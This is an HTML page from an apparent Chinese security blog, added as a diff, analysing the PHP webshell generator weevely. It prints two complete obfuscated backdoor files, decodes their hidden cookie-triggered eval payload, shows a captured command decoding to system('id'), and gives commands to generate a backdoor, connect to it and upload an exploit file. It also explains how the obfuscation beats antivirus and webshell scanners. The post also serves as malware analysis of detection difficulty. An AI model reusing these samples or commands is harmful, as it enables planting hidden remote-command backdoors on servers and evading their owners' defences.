@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>PHP后门生成工具weevely分析 | Blog of Secer</title>
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/css/style.css" />
+  <meta name="generator" content="Blog of Secer">
+
+  
+  
+  
+
+  
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body class="home-template">
+<div id="perspective" class="perspective effect-movedown">
+  <div class="container">
+    <!-- wrapper -->
+    <div class="wrapper">
+
+      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">Blog of Secer</h1>
+            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
+        </div>
+    </div>
+</header>
+
+      
+
+<main class="content" role="main">
+  <article class="post">
+    <span class="post-meta">
+      <time datetime="2012-10-22T05:05:32.000Z" itemprop="datePublished">
+          2012-10-22
+      </time>
+    
+    
+    | 
+    <a href='/tag/后门/'>后门</a>,
+    
+    <a href='/tag/weevely/'>weevely</a>
+    
+    
+</span>
+    <h1 class="post-title">PHP后门生成工具weevely分析</h1>
+    <section class="post-content">
+      <p></p><p>唐门三少@T00LS</p>  <p>最近闲的蛋疼，玩了下weevely这个工具，感觉还是蛮强大的，防查杀，连接也是加密的。感兴趣的朋友看正文吧。    <br><b>0x01 </b><b>摘要</b>     <br>&#160;&#160;&#160;&#160;&#160; <a href="http://ha.cker.in/tag/weevely" target="_blank">weevely</a>是一款针对PHP的webshell的自由软件，可用于模拟一个类似于telnet的连接shell，weevely通常用于web程序的漏洞利用，隐藏<a href="http://ha.cker.in/tag/后门" target="_blank">后门</a>或者使用类似telnet的方式来代替web 页面式的管理，<a href="http://ha.cker.in/tag/weevely" target="_blank">weevely</a>生成的服务器端php代码是经过了base64编码的，所以可以骗过主流的杀毒软件和IDS，上传服务器端代码后通常可以通过weevely直接运行。     <br>&#160;&#160;&#160;&#160;&#160; weevely所生成的PHP后门所使用的方法是现在比较主流的base64加密结合字符串变形技术，后门中所使用的函数均是常用的字符串处理函数，被作为检查规则的eval，system等函数都不会直接出现在代码中，从而可以致使<a href="http://ha.cker.in/tag/后门" target="_blank">后门</a>文件绕过后门查找工具的检查。使用暗组的Web后门查杀工具进行扫描，结果显示该文件无任何威胁，如下图。     <br><a href="http://img.cker.in/PHPweevely_127EF/clip_image001.png" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/PHPweevely_127EF/clip_image001_thumb.png" width="561" height="618"></a>     <br>在本篇文章中，将针对其所生成的PHP后门进行分析，浅析其绕过后门查杀工具的原理，以及其运行与客户端交互的执行过程。 </p><br><a id="more"></a><p></p>
+<p><b>0x02 </b><b>后门代码分析</b>     <br>先看下这个工具在相同条件下生成的两个<a href="http://ha.cker.in/tag/后门" target="_blank">后门</a>的代码，     <br><b>backdoor1.php</b></p>  <p>&lt;?php</p>  <p>$jr=&quot;e2luaVay9zZXQoJ2Vycaym9yX2xvayZycsayICaycvZGV2L251bGwnKTsaykayaayz0nayc3QnO2VjaG8aygJzwnLiRrLic+Jzt&quot;;</p>  <p>$pxn=&quot;ldmayFaysKayGJhcay2U2NF9kZWNvZGayUocHJlZ19yZXBsYWNlKGFycmF5KCcvW15cdz1cc10vJywnL1ayxzayLyaycpLCBhcnJheSgn&quot;;</p>  <p>$gip = str_replace(&quot;b&quot;,&quot;&quot;,&quot;bsbtbrb_rebplbabcbe&quot;);</p>  <p>$pjp=&quot;JyaywnKyaycaypLCBqbay2luKayGayFycmF5ayX3NsaWNlKCRhLCRjKCayRhKSay0zKSaykpKSk7ZayWNobyayAnPC8nLiRrLic+Jzt9&quot;;</p>  <p>$esx=&quot;JayGM9Jay2NvaydW5ay0JzayskYT0kX0NPT0aytJRTtpZihyZXNlaydCgaykYSk9PaySd0ZScgJiayYgJayGMoJGEpPjMpay&quot;;</p>  <p>$ld = $gip(&quot;bh&quot;, &quot;&quot;, &quot;bhbbhabhsbhebh6bh4bh_bhdbhebhcobhde&quot;);</p>  <p>$zjr = $gip(&quot;h&quot;,&quot;&quot;,&quot;hchrhehahthe_fhuhnhchthihohn&quot;);</p>  <p>$oj = $zjr(‘’, $ld($gip(&quot;ay&quot;, &quot;&quot;, $esx.$jr.$pxn.$pjp))); $oj();</p>  <p>?&gt;</p>  <p><b>backdoor2.php</b></p>  <p>&lt;?php</p>  <p>$poj=&quot;GJhc2U2NFcgh9kZcghWNvZGUocHJlcghZcgh19yZXBsYWNcghlKGFycmF5KCcvW15cdz1cc10vJywnL1xzLycpLCBhcnJheSgncghJy&quot;;</p>  <p>$qir=&quot;JGM9J2NvdW50JzskcghYT0kX0NcghPT0tJRTtpZihyZXNldCgkYcghSk9PSd0ZScgJiYgJcghGMoJGEpPjMpe2luaVcgh&quot;;</p>  <p>$eg = str_replace(&quot;j&quot;,&quot;&quot;,&quot;sjtrj_jrjejpjljajcje&quot;);</p>  <p>$sh=&quot;wnKycpLCBqb2luKGFcghycmF5X3NcghscghaWNlKCRhLCRjKCRhKS0zKSkcghpKSk7ZWNobyAcghnPC8nLiRrLic+Jzt9&quot;;</p>  <p>$cfw=&quot;9zZXcghQoJ2Vycm9yX2xvZycsICccghvZcghGV2L251cghbGwnKTskaz0nc3QcghnO2VjaG8gJzwnLiRrcghLic+JztldmFsK&quot;;</p>  <p>$pf = $eg(&quot;z&quot;, &quot;&quot;, &quot;zbzazse6z4_zdzezcozdze&quot;);</p>  <p>$wvu = $eg(&quot;w&quot;,&quot;&quot;,&quot;cwrwewatwew_wfwuwnwcwtwiwown&quot;);</p>  <p>$qfr = $wvu(‘’, $pf($eg(&quot;cgh&quot;, &quot;&quot;, $qir.$cfw.$poj.$sh))); $qfr();</p>  <p>?&gt;</p>  <p>对比两篇代码，首先发现变量名不同，说明变量名是随机生成的，通过多次的生成查看，能够确定变量名是有两到三个随机字符组成的（不包含下划线）。    <br>下面我们通过backdoor1.php代码来看下，后门程序执行的过程。     <br>首先定义$jr和$pxn的字符串变量，然后通过str_replace函数去除“bsbtbrb_rebplbabcbe”字符串中的b，赋给$gip，即$gip=str_replace。在此之后，调用str_replace函数时，均用$gip来代替，这样做的目的应该是避免多次出现str_replace，从而导致查杀程序关注。在对比一下backdoor2.php，发现在backdoor.php中这条语句，用“j”代替了“b”，说明这个间隔字符也是随机生成的。     <br>再向下面看，定义$pjp和$esx字符串变量后，通过前面说的$gip变量执行str_replace函数功能，赋$Id值为base64_decode，赋$zjr值为create_function。和之前的$gip变量一样，间隔字符也是随机生成的。     <br>最重要的就是最后的这一行代码了，之前的内容都是来为这行的执行进行准备的。我们来分析下它的内容</p>  <p>$oj = $zjr(‘’, $ld($gip(&quot;ay&quot;, &quot;&quot;, $esx.$jr.$pxn.$pjp)));</p>  <p>先将前面我们分析过的变量对照这句中进行下转换</p>  <p>$oj = create_function(‘’, base64_decode(str_replace(&quot;ay&quot;, &quot;&quot;, $esx.$jr.$pxn.$pjp)));</p>  <p>四个字符串变量的内容太长了，自己一个个去找太麻烦了，我修改了下代码，添加这样一条语句</p>  <p>print base64_decode(str_replace(&quot;ay&quot;, &quot;&quot;, $esx.$jr.$pxn.$pjp);</p>  <p>来查看str_replace执行后的样子，结果如下图    <br><a href="http://img.cker.in/PHPweevely_127EF/image.png" target="_blank"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="image" border="0" alt="image" src="http://img.cker.in/PHPweevely_127EF/image_thumb.png" width="975" height="120"></a>     <br>代码内容如下</p>  <p>$c=’count’;</p>  <p>$a=$_COOKIE;</p>  <p>if(reset($a)==’te’ &amp;&amp; $c($a)&gt;3)</p>  <p>{</p>  <p>ini_set(‘error_log’, ‘/dev/null’);</p>  <p>$k=’st’;</p>  <p>echo’&lt;’.$k.’&gt;’;</p>  <p>eval(base64_decode(preg_replace(array(‘/[^\w=\s]/‘,’/\s/‘), array(‘’,’+’), join(array_slice($a,$c($a)-3)))));</p>  <p>echo ‘&lt;/‘.$k.’&gt;’;</p>  <p>}</p>  <p>执行过程为，通过赋予$c值为count，为后面执行count函数做准备，然后提取客户端提交的cookie内容赋给$a。通过判断cookie中第一个内容值是否为te，且cookie内容是否大于3。符合条件则，设置错误日志不保存，定义$k值为st，作为返回数据的开始和结束标识。然后对cookie的倒数第3条内容进行组合和正则替换，下面通过从Wireshark抓取的一条交互数据来说明执行过程。    <br>抓取的cookie数据内容为</p>  <p>PREF=te; USR=mCvD4rtLQ7ngeBvD; SID=c3lzd&amp;GV; SESSID=?t@K-Cdp; USRID=ZCAyP-i/Yx#J-y?k7</p>  <p>执行过程中将SID，SESSID，USRID的值合并为</p>  <p>c3lzd&amp;GV?t@K-CdpZCAyP-i/Yx#J-y?k7</p>  <p>通过正则替换将非字母数据剔除，空白符数据用“+”替代得到内容：</p>  <p>c3lzdGVtKCdpZCAyPiYxJyk7</p>  <p>base64解密后内容为“system(‘id 2&gt;&amp;1’);”，之后eval执行这条语句，也不用再说什么了。    <br>代码分析到这里也就差不多了，稍微要提一下的是，我在生成这个PHP后门时，密码设置的是test，所以他在代码中它会校验cookie第一个内容的值是否为te。但是，如果输入tes这样的内容当做密码来连接后门时，会出现错误。抓包分析了下，应该是客户在连接的过程中会有一个加密校验的过程，这个过程是怎么进行的，能力有限，分析不出来。不过可以肯定的是，这个程序生成的后门即使有人得到了我们的PHP后门代码，他们也不能使用。     <br><b>0x03 Weevely</b><b>使用方法简介</b>     <br><b>1.&#160;&#160;&#160;&#160;&#160;&#160;&#160; </b><b>生成</b><b>PHP</b><b>后门</b>     <br>./weevely.py generate test ~/backdoor.php&#160;&#160; <br>/<em>     <br>这句话的意思是生成一个密码为test的后门文件并保存为用户目录中的     <br>backdoor.php。路径信息也可以省略，如果省略生成文件则放在当前所     <br>在目录下     <br></em>/     <br><b>2.&#160;&#160;&#160;&#160;&#160;&#160;&#160; </b><b>连接后门</b>     <br>./weevely.py <a href="http://127.0.0.1/backdoor.php" target="_blank" rel="external">http://127.0.0.1/backdoor.php</a> test     <br><b>3.&#160;&#160;&#160;&#160;&#160;&#160;&#160; </b><b>应用内置模块</b>     <br>这里以上传文件为示例，在连接成功后的shell中输入     <br>:file.uplaod /root/exploit.c exploit.c     <br>/<em>其中第一个参数为本地文件路径（要用绝对路径），第二个参数为远程路径</em>/     <br><b>0x04 </b><b>总结</b>     <br>1.&#160;&#160;&#160;&#160;&#160;&#160;&#160; <a href="http://ha.cker.in/tag/weevely" target="_blank">Weevely</a>比较明显的局限性在于，他只能生成PHP的后门文件     <br>2.&#160;&#160;&#160;&#160;&#160;&#160;&#160; 加密连接过程要依赖于客户端。如果在未知密码的情况下，获得后门文件，可以针对这个后门文件自己编写一个简单的客户端，无需密码，也可连接这个后门     <br>3.&#160;&#160;&#160;&#160;&#160;&#160;&#160; 检查这种类型的<a href="http://ha.cker.in/tag/后门" target="_blank">后门</a>难度很大，全篇代码中只出现过一个str_replace函数的使用，其他的函数都是通过变量整合的方法来调用。而且敏感的字符串都会通过随机字符串进行间隔，很难找到其特征，唯一的方法就是从行为上分析，文件是否有害。</p>
+    </section>
+    <footer class="post-footer">
+      <section class="author">
+    <h4>Secer</h4>
+    <p>记录互联网安全历程与个人成长经历</p>
+</section>
+      <section class="share">
+    <h4>Share this post</h4>
+    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/897.seo/" target="_blank">
+        <span class="hidden">weibo</span>
+    </a>
+    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/897.seo/"
+       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <span class="hidden">Twitter</span>
+    </a>
+    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/897.seo/"
+       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <span class="hidden">Facebook</span>
+    </a>
+    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/897.seo/"
+       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+        <span class="hidden">Google+</span>
+    </a>
+</section>
+
+    </footer>
+  </article>
+  <nav class="pagination" role="pagination">
+    
+    <a class="newer-posts" href="/900.seo/">
+        ← 注射加简单社工拿下凤凰网某分站
+    </a>
+    
+    <span class="icon-logo">•</span>
+    
+    <a class="older-posts" href="/895.seo/">
+        浅谈渗透测试中的逆向破解 →
+    </a>
+    
+</nav>
+
+  <div id="comment" class="comments-area">
+    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
+    
+</div>
+
+</main>
+
+
+      
+<footer class="site-footer">
+  
+  <div class="inner">
+     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
+  </div>
+</footer>
+
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+<script type="text/javascript" src="/js/menu.js"></script>
+
+
+
+
+
+  </div>
+</div>
+
+<nav  class="outer-nav top horizontal">
+
+          <a class="icon-home"  href="/"><span>Home</span></a>
+
+          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+
+          <a class="icon-image"  href="/images"><span>Images</span></a>
+
+          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+
+          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
+
+          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+
+</nav>
+
+</div>
+</body>
+</html>
